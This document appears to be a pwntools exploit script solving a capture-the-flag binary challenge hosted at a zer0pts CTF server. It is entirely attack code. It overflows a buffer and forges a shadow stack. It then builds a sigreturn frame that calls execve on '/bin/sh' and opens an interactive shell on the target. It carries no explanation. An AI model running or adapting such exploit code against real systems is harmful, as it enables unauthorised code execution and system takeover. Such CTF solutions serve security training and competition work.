#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall')
else:
    s = remote('pwn.ctf.zer0pts.com', 9011)

stack_depth = 0x60022e
stack_shadow = 0x600234
syscall = 0x4001ec
vuln = 0x40017c
notvuln = 0x4000eb

payload = b''
payload += b'A' * 0x100
payload += p64(stack_depth + 0x100)

s.sendafter('Data: ', payload)

shadow = b''
shadow += p64(syscall)
shadow += p64(syscall)
shadow += p64(vuln)
shadow += p64(notvuln)

payload = b''
payload += p32(len(shadow) // 8)
payload += b'AA'
payload += shadow
payload = payload.ljust(0x50)
payload += b'/bin/sh\0'

s.sendafter('Data: ', payload)

frame = SigreturnFrame(arch = 'x86_64')
frame.rax = 0x3b
frame.rdi = stack_depth + 0x50
frame.rip = syscall

s.sendafter('Data: ', 'A')
s.sendafter('Data: ', bytes(frame))
s.sendafter('Data: ', 'A' * 0xf)

s.interactive()
